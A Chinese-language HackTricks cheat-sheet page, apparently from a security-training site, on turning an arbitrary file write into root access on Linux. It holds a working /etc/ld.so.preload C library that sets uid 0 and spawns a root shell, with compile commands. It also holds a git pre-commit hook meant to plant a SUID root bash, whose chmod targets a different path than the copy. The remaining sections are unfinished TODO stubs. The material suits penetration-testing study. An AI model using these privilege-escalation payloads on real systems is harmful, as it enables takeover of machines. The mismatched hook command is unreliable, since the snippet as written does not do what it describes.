# 任意文件写入到根目录

<details>

<summary><strong>从零开始学习AWS黑客技术，成为专家</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>！</strong></summary>

支持HackTricks的其他方式：

* 如果您想看到您的**公司在HackTricks中做广告**或**下载PDF格式的HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
* 获取[**官方PEASS & HackTricks周边产品**](https://peass.creator-spring.com)
* 探索[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群**](https://discord.gg/hRep4RUj7f) 或 [**电报群**](https://t.me/peass) 或 **关注**我们的**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* 通过向[**HackTricks**](https://github.com/carlospolop/hacktricks)和[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>

### /etc/ld.so.preload

这个文件的行为类似于**`LD_PRELOAD`**环境变量，但它也适用于**SUID二进制文件**。\
如果您可以创建或修改它，只需添加一个**将随每个执行的二进制文件一起加载的库的路径**。

例如：`echo "/tmp/pe.so" > /etc/ld.so.preload`
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unlink("/etc/ld.so.preload");
setgid(0);
setuid(0);
system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
### Git hooks

[**Git hooks**](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks)是在git存储库中的各种事件（例如创建提交，合并等）上运行的**脚本**。因此，如果一个**特权脚本或用户**频繁执行这些操作并且可以**写入`.git`文件夹**，这可能被用于**提权**。

例如，可以在git存储库的**`.git/hooks`**中生成一个脚本，以便在创建新提交时始终执行：
```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/b' > pre-commit
chmod +x pre-commit
```
### Cron & Time files

待办事项

### Service & Socket files

待办事项

### binfmt_misc

位于`/proc/sys/fs/binfmt_misc`的文件指示哪个二进制文件应该执行哪种类型的文件。待办事项：检查滥用此功能以在打开常见文件类型时执行反向shell的要求。
